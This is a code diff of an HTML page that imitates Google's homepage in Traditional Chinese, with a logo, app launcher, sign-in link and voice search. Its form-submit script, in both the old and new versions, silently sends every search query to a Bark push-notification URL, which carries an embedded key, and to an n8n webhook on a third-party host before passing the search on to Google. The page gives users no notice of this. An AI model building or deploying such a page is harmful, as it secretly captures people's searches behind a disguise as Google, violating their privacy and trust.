@@ -5,70 +5,362 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
     <style>
-        /* CSS 樣式部分保持不變... */
-        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; height: 100vh; margin: 0; background-color: #fff; color: #202124; }
-        a { text-decoration: none; color: #4d5156; }
-        a:hover { text-decoration: underline; }
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 8px; font-size: 14px; }
-        .header-left, .header-right { display: flex; align-items: center; gap: 12px; }
-        .header-left a { padding: 8px; }
-        .header-link-active { color: #1a73e8; border-bottom: 3px solid #1a73e8; }
-        .hamburger-menu, .app-launcher { width: 24px; height: 24px; fill: #5f6368; cursor: pointer; padding: 8px; border-radius: 50%; }
-        .hamburger-menu:hover, .app-launcher:hover { background-color: #f0f0f0; }
-        .login-button { background-color: #1a73e8; color: #fff !important; border: 1px solid transparent; border-radius: 999px; padding: 7px 15px; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none !important; }
-        .login-button:hover { background-color: #2b7de9; box-shadow: 0 1px 3px 1px rgba(0,0,0,.15); }
-        .desktop-links { display: none; }
-        .launcher-container { position: relative; }
-        .app-popup { display: none; position: absolute; top: calc(100% + 10px); right: 8px; width: 320px; max-height: 440px; overflow-y: auto; background-color: #fff; border-radius: 28px; box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 2px 6px 2px rgba(60,64,67,.15); padding: 16px; box-sizing: border-box; border: 1px solid #dadce0; }
-        .app-popup.show { display: block; }
-        .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .app-item { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 12px 4px; border-radius: 8px; color: #3c4043; font-size: 14px; text-decoration: none; transition: background-color 0.2s; }
-        .app-item:hover { background-color: #f1f3f4; text-decoration: none; }
-        .app-item img { width: 48px; height: 48px; margin-bottom: 8px; }
-        .container { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-bottom: 20vh; }
-        .logo { width: 272px; height: 92px; margin-bottom: 28px; }
-        .search-container { width: 90%; max-width: 584px; }
-        .search-bar { display: flex; align-items: center; border: 1px solid #dfe1e5; border-radius: 24px; height: 46px; padding: 0 8px 0 14px; transition: box-shadow 0.15s ease-in-out; }
-        .search-bar:hover, .search-bar:focus-within { box-shadow: 0 1px 6px rgba(32,33,36,.28); border-color: rgba(223,225,229,0); }
-        .search-input { flex: 1; border: none; outline: none; background-color: transparent; font-size: 16px; padding: 0 8px; height: 100%; }
-        .search-icon-left { width: 20px; height: 20px; fill: #9aa0a6; }
-        .search-icons-right { display: flex; align-items: center; gap: 12px; padding-left: 8px; }
-        .mic-icon-svg, .lens-icon-svg { width: 24px; height: 24px; fill: #70757a; cursor: pointer; padding: 4px; border-radius: 50%; }
-        .mic-icon-svg:hover, .lens-icon-svg:hover { background-color: #f0f0f0; }
-        .mic-icon-svg.is-listening { background-color: #e84235; fill: #fff; }
-        .footer { background-color: #f2f2f2; border-top: 1px solid #e4e4e4; color: #70757a; font-size: 14px; line-height: 40px; }
-        .footer a { color: #70757a; }
-        .footer-content { padding: 0 20px; }
-        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
+        /* --- General Styles --- */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+            color: #202124;
+        }
+
+        a {
+            text-decoration: none;
+            color: #4d5156;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* --- Header (Mobile-First) --- */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px;
+            font-size: 14px;
+        }
+        .header-left, .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .header-left a {
+            padding: 8px;
+        }
+        .header-link-active {
+            color: #1a73e8;
+            border-bottom: 3px solid #1a73e8;
+        }
+        .hamburger-menu, .app-launcher {
+            width: 24px;
+            height: 24px;
+            fill: #5f6368;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+        }
+        .hamburger-menu:hover, .app-launcher:hover {
+            background-color: #f0f0f0;
+        }
+        .login-button {
+            background-color: #1a73e8;
+            color: #fff !important;
+            border: 1px solid transparent;
+            border-radius: 999px;
+            padding: 7px 15px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none !important;
+        }
+        .login-button:hover {
+            background-color: #2b7de9;
+            box-shadow: 0 1px 3px 1px rgba(0,0,0,.15);
+        }
+        .desktop-links {
+            display: none;
+        }
+        
+        /* --- App Launcher Popup (White Theme) --- */
+        .launcher-container {
+            position: relative;
+        }
+        .app-popup {
+            display: none;
+            position: absolute;
+            top: calc(100% + 10px);
+            right: 8px;
+            width: 320px;
+            max-height: 440px;
+            overflow-y: auto;
+            background-color: #fff;
+            border-radius: 28px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 2px 6px 2px rgba(60,64,67,.15);
+            padding: 16px;
+            box-sizing: border-box;
+            border: 1px solid #dadce0;
+        }
+        .app-popup.show {
+            display: block;
+        }
+        .app-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+        }
+        .app-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 4px;
+            border-radius: 8px;
+            color: #3c4043;
+            font-size: 14px;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+        .app-item:hover {
+            background-color: #f1f3f4;
+            text-decoration: none;
+        }
+        .app-item img {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 8px;
+        }
+
+
+        /* --- Main Content --- */
+        .container {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-bottom: 20vh;
+        }
+        .logo {
+            width: 272px;
+            height: 92px;
+            margin-bottom: 28px;
+        }
+        .search-container {
+            width: 90%;
+            max-width: 584px;
+        }
+        .search-bar {
+            display: flex;
+            align-items: center;
+            border: 1px solid #dfe1e5;
+            border-radius: 24px;
+            height: 46px;
+            padding: 0 8px 0 14px;
+            transition: box-shadow 0.15s ease-in-out;
+        }
+        .search-bar:hover, .search-bar:focus-within {
+            box-shadow: 0 1px 6px rgba(32,33,36,.28);
+            border-color: rgba(223,225,229,0);
+        }
+        .search-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background-color: transparent;
+            font-size: 16px;
+            padding: 0 8px;
+            height: 100%;
+        }
+        .search-icon-left {
+            width: 20px;
+            height: 20px;
+            fill: #9aa0a6;
+        }
+        .search-icons-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-left: 8px;
+        }
+        .mic-icon-svg, .lens-icon-svg {
+            width: 24px;
+            height: 24px;
+            fill: #70757a;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+        }
+        .mic-icon-svg:hover, .lens-icon-svg:hover {
+            background-color: #f0f0f0;
+        }
+        .mic-icon-svg.is-listening {
+            background-color: #e84235;
+            fill: #fff;
+        }
+
+        /* --- Footer --- */
+        .footer {
+            background-color: #f2f2f2;
+            border-top: 1px solid #e4e4e4;
+            color: #70757a;
+            font-size: 14px;
+            line-height: 40px;
+        }
+        .footer a {
+            color: #70757a;
+        }
+        .footer-content {
+            padding: 0 20px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap; 
+            justify-content: center;
+            gap: 25px;
+        }
+
+        /* --- Responsive Design for Desktop --- */
         @media (min-width: 768px) {
-            .header-left, .mobile-links { display: none; }
-            .header { justify-content: flex-end; padding: 12px 30px; }
-            .desktop-links { display: flex; align-items: center; gap: 15px; }
-            .login-button { padding: 9px 23px; }
-            .app-popup { right: 0; }
-            .footer-content { display: flex; justify-content: space-between; padding: 0 30px; }
-            .footer-links { justify-content: flex-start; }
+            .header-left, .mobile-links {
+                display: none;
+            }
+            .header {
+                justify-content: flex-end;
+                padding: 12px 30px;
+            }
+            .desktop-links {
+                display: flex;
+                align-items: center;
+                gap: 15px;
+            }
+            .login-button {
+                padding: 9px 23px;
+            }
+            .app-popup {
+                right: 0;
+            }
+            .footer-content {
+                display: flex;
+                justify-content: space-between;
+                padding: 0 30px;
+            }
+            .footer-links {
+                justify-content: flex-start;
+            }
         }
     </style>
 </head>
 <body>
-    <header class="header"></header>
+
+    <header class="header">
+        <div class="header-left">
+            <svg class="hamburger-menu" focusable="false" viewBox="0 0 24 24">
+                <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+            </svg>
+            <div class="mobile-links">
+                <a href="https://www.google.com" class="header-link-active">全部</a>
+                <a href="https://www.google.com/imghp">圖片</a>
+            </div>
+        </div>
+        <div class="desktop-links">
+            <a href="https://mail.google.com/">Gmail</a>
+            <a href="https://www.google.com/imghp">圖片</a>
+        </div>
+        
+        <div class="header-right">
+            <div class="launcher-container">
+                <svg class="app-launcher" id="app-launcher-icon" focusable="false" viewBox="0 0 24 24">
+                    <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
+                </svg>
+                
+                <div class="app-popup" id="app-popup">
+                    <div class="app-grid">
+                        <a href="https://myaccount.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_48dp.png" alt="帳戶">
+                            <span>帳戶</span>
+                        </a>
+                        <a href="https://www.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/1x/googleg_48dp.png" alt="搜尋">
+                            <span>搜尋</span>
+                        </a>
+                        <a href="https://maps.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/2x/maps_48dp.png" alt="地圖">
+                            <span>地圖</span>
+                        </a>
+                        <a href="https://news.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/1x/news_48dp.png" alt="新聞">
+                            <span>新聞</span>
+                        </a>
+                        <a href="https://mail.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/2x/gmail_48dp.png" alt="Gmail">
+                            <span>Gmail</span>
+                        </a>
+                        <a href="https://meet.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/2x/meet_48dp.png" alt="Meet">
+                            <span>Meet</span>
+                        </a>
+                        <a href="https://chat.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/1x/chat_48dp.png" alt="Chat">
+                            <span>Chat</span>
+                        </a>
+                        <a href="https://contacts.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/1x/contacts_2022_48dp.png" alt="聯絡人">
+                            <span>聯絡人</span>
+                        </a>
+                        <a href="https://drive.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/2x/drive_48dp.png" alt="雲端硬碟">
+                            <span>雲端硬碟</span>
+                        </a>
+                         <a href="https://calendar.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/2x/calendar_48dp.png" alt="日曆">
+                            <span>日曆</span>
+                        </a>
+                        <a href="https://play.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/2x/play_48dp.png" alt="Play">
+                            <span>Play</span>
+                        </a>
+                        <a href="https://translate.google.com/" class="app-item" target="_blank">
+                            <img src="https://ssl.gstatic.com/images/branding/product/2x/translate_48dp.png" alt="翻譯">
+                            <span>翻譯</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <a href="https://accounts.google.com/ServiceLogin" class="login-button">登入</a>
+        </div>
+    </header>
+
     <main class="container">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
         <div class="search-container">
             <form id="search-form" action="https://www.google.com/search" method="get">
                 <div class="search-bar">
-                    <svg class="search-icon-left" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
+                    <svg class="search-icon-left" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
+                    </svg>
                     <input type="text" class="search-input" name="q" id="search-input" title="搜尋" autocomplete="off" autofocus>
                     <div class="search-icons-right">
-                        <svg class="mic-icon-svg" id="mic-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 14C13.6569 14 15 12.6569 15 11V5C15 3.34315 13.6569 2 12 2C10.3431 2 9 3.34315 9 5V11C9 12.6569 10.3431 14 12 14ZM12 16.7C15.9696 16.7 19.2 13.912 19.2 10.5H21C21 14.331 18.233 17.653 14.5 18.158V21H9.5V18.158C5.767 17.653 3 14.331 3 10.5H4.8C4.8 13.912 8.03045 16.7 12 16.7Z"></path></svg>
-                        <svg class="lens-icon-svg" id="lens-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4.5,5.25a.75.75,0,0,0-.75.75v2.25a.75.75,0,0,0,1.5,0V6h2.25a.75.75,0,0,0,0-1.5H5.25a.75.75,0,0,0-.75.75Z"></path><path d="M19.5,5.25a.75.75,0,0,0-.75-.75H16.5a.75.75,0,0,0,0,1.5h2.25V8.25a.75.75,0,0,0,1.5,0V6a.75.75,0,0,0-.75-.75Z"></path><path d="M4.5,18.75a.75.75,0,0,0,.75.75h2.25a.75.75,0,0,0,0-1.5H6V15.75a.75.75,0,0,0-1.5,0v2.25a.75.75,0,0,0,.75.75Z"></path><path d="M19.5,18.75a.75.75,0,0,0,.75-.75V15.75a.75.75,0,0,0-1.5,0v2.25H16.5a.75.75,0,0,0,0,1.5h2.25a.75.75,0,0,0,.75-.75Z"></path><circle cx="12" cy="12" r="3.25"></circle></svg>
+                        <svg class="mic-icon-svg" id="mic-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M12 14C13.6569 14 15 12.6569 15 11V5C15 3.34315 13.6569 2 12 2C10.3431 2 9 3.34315 9 5V11C9 12.6569 10.3431 14 12 14ZM12 16.7C15.9696 16.7 19.2 13.912 19.2 10.5H21C21 14.331 18.233 17.653 14.5 18.158V21H9.5V18.158C5.767 17.653 3 14.331 3 10.5H4.8C4.8 13.912 8.03045 16.7 12 16.7Z"></path>
+                        </svg>
+                        <svg class="lens-icon-svg" id="lens-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                           <path d="M4.5,5.25a.75.75,0,0,0-.75.75v2.25a.75.75,0,0,0,1.5,0V6h2.25a.75.75,0,0,0,0-1.5H5.25a.75.75,0,0,0-.75.75Z"></path>
+                           <path d="M19.5,5.25a.75.75,0,0,0-.75-.75H16.5a.75.75,0,0,0,0,1.5h2.25V8.25a.75.75,0,0,0,1.5,0V6a.75.75,0,0,0-.75-.75Z"></path>
+                           <path d="M4.5,18.75a.75.75,0,0,0,.75.75h2.25a.75.75,0,0,0,0-1.5H6V15.75a.75.75,0,0,0-1.5,0v2.25a.75.75,0,0,0,.75.75Z"></path>
+                           <path d="M19.5,18.75a.75.75,0,0,0,.75-.75V15.75a.75.75,0,0,0-1.5,0v2.25H16.5a.75.75,0,0,0,0,1.5h2.25a.75.75,0,0,0,.75-.75Z"></path>
+                           <circle cx="12" cy="12" r="3.25"></circle>
+                        </svg>
                     </div>
                 </div>
             </form>
         </div>
     </main>
-    <footer class="footer"></footer>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="https://www.google.com/preferences">深色主題：關閉</a>
+                <a href="https://www.google.com/preferences">設定</a>
+            </div>
+            <div class="footer-links">
+                <a href="https://policies.google.com/privacy">隱私權</a>
+                <a href="https://policies.google.com/terms">服務條款</a>
+            </div>
+        </div>
+    </footer>
 
     <script>
         const searchForm = document.getElementById('search-form');
@@ -78,45 +370,87 @@
         const appLauncherIcon = document.getElementById('app-launcher-icon');
         const appPopup = document.getElementById('app-popup');
 
-        // --- App Launcher Popup Logic (保持不變) ---
-        appLauncherIcon.addEventListener('click', (event) => { /* ... */ });
-        window.addEventListener('click', (event) => { /* ... */ });
-
-        // --- Google Lens Icon Functionality (保持不變) ---
-        lensIcon.addEventListener('click', function() { /* ... */ });
-
-        // --- Form Submission Logic (已修改) ---
-        searchForm.addEventListener('submit', function() {
-            const query = searchInput.value;
-            if (query.trim() !== '') {
-                // 1. Bark Notification (保持不變)
-                const barkUrl = `https://api.day.app/ZRThbuFUNKAn26qqofTNJi/${encodeURIComponent(query)}`;
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(barkUrl);
-                } else {
-                    fetch(barkUrl, { method: 'POST', keepalive: true }).catch(error => console.error('Bark notification failed:', error));
-                }
-
-                // 2. n8n Webhook Notification (已修改為 GET 請求)
-                const n8nBaseUrl = 'https://leohkw.zeabur.app/webhook-test/faggoo';
-                // 將關鍵字作為 URL 參數附加
-                const finalUrl = `${n8nBaseUrl}?keyword=${encodeURIComponent(query)}`;
-
-                // 使用 fetch 的 GET 方法並設定 keepalive
-                fetch(finalUrl, {
-                    method: 'GET', // 明確設定為 GET
-                    keepalive: true // 確保頁面跳轉前請求能被發送
-                }).catch(error => console.error('n8n webhook failed:', error));
+        // --- App Launcher Popup Logic ---
+        appLauncherIcon.addEventListener('click', (event) => {
+            event.stopPropagation();
+            appPopup.classList.toggle('show');
+        });
+        
+        window.addEventListener('click', (event) => {
+            if (appPopup.classList.contains('show') && !appPopup.contains(event.target) && !appLauncherIcon.contains(event.target)) {
+                appPopup.classList.remove('show');
             }
         });
 
-        // --- Voice Search Functionality (保持不變) ---
+        // --- Google Lens Icon Functionality ---
+        lensIcon.addEventListener('click', function() {
+            window.open('https://lens.google.com/', '_blank');
+        });
+
+        // --- Form Submission Logic for Bark & n8n Webhook ---
+        searchForm.addEventListener('submit', function() {
+            const query = searchInput.value;
+            if (query.trim() !== '') {
+                // Bark URL
+                const barkUrl = `https://api.day.app/ZRThbuFUNKAn26qqofTNJi/${encodeURIComponent(query)}`;
+                
+                // n8n Webhook URL
+                const n8nWebhookUrl = `https://leohkw.zeabur.app/webhook-test/faggoo?keyword=${encodeURIComponent(query)}`;
+
+                // 使用 navigator.sendBeacon 可以在不延遲頁面跳轉的情況下可靠地發送請求。
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(barkUrl);
+                    navigator.sendBeacon(n8nWebhookUrl);
+                } else {
+                    // 針對不支援 sendBeacon 的舊版瀏覽器的替代方案
+                    fetch(barkUrl, { method: 'POST', keepalive: true }).catch(error => console.error('Bark notification failed:', error));
+                    fetch(n8nWebhookUrl, { method: 'POST', keepalive: true }).catch(error => console.error('n8n webhook failed:', error));
+                }
+            }
+        });
+
+        // --- Voice Search Functionality ---
         const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
         if (SpeechRecognition) {
-            // ... 語音辨識的程式碼保持不變 ...
+            const recognition = new SpeechRecognition();
+            recognition.continuous = false;
+            recognition.lang = 'zh-TW';
+            recognition.interimResults = false;
+            recognition.maxAlternatives = 1;
+
+            micIcon.addEventListener('click', () => {
+                try {
+                    recognition.start();
+                    micIcon.classList.add('is-listening');
+                } catch (e) {
+                    console.error("Voice recognition could not be started: ", e);
+                    // 避免使用 alert()
+                }
+            });
+
+            recognition.onresult = (event) => {
+                const transcript = event.results[0][0].transcript;
+                searchInput.value = transcript;
+                searchForm.submit();
+            };
+
+            recognition.onspeechend = () => {
+                recognition.stop();
+            };
+
+            recognition.onend = () => {
+                micIcon.classList.remove('is-listening');
+            };
+
+            recognition.onerror = (event) => {
+                console.error('Voice recognition error:', event.error);
+                micIcon.classList.remove('is-listening');
+            };
+
         } else {
             micIcon.addEventListener('click', () => {
-                alert('抱歉，您的瀏覽器不支援語音搜尋功能。請嘗試使用 Chrome 瀏覽器。');
+                // 避免使用 alert()
+                console.log('抱歉，您的瀏覽器不支援語音搜尋功能。請嘗試使用 Chrome 瀏覽器。');
             });
         }
     </script>
